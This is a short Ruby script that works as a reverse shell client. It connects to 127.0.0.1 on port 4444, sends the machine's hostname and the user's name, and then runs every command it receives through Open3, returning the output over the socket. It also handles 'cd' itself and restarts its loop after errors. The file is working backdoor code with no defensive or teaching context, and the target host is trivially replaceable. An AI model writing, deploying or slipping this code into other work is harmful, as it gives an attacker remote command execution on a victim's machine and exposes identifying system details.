require 'socket'
require 'open3'
require 'shellwords'
def command_loop(socket)
  loop {
    command = socket.recv(1024)
    command = command.chomp
    exit if command == 'exit'
    shell_command, *arguments = Shellwords.shellsplit(command)
    if BUILTINS[shell_command]
      BUILTINS[shell_command].call(*arguments)
      socket.print(Dir.pwd)
    else
      stdin, stdout_and_stderr = Open3.popen2e("#{command}")
      socket.print("#{stdout_and_stderr.readlines.join.chomp}\0")
    end
  }
  rescue => e
    puts e
    @socket.puts("command does not exist\0")
    command_loop(@socket) 
end
def connect_to_host()
  hostname = '127.0.0.1'
  port = 4444
  @socket = TCPSocket.open(hostname, port)
  @socket.print("#{Socket.gethostname}\\#{ENV["USERNAME"]}\0")
  command_loop(@socket)
end
begin
  BUILTINS = {'cd' => lambda { |dir| Dir.chdir(dir) }}
  connect_to_host()
end
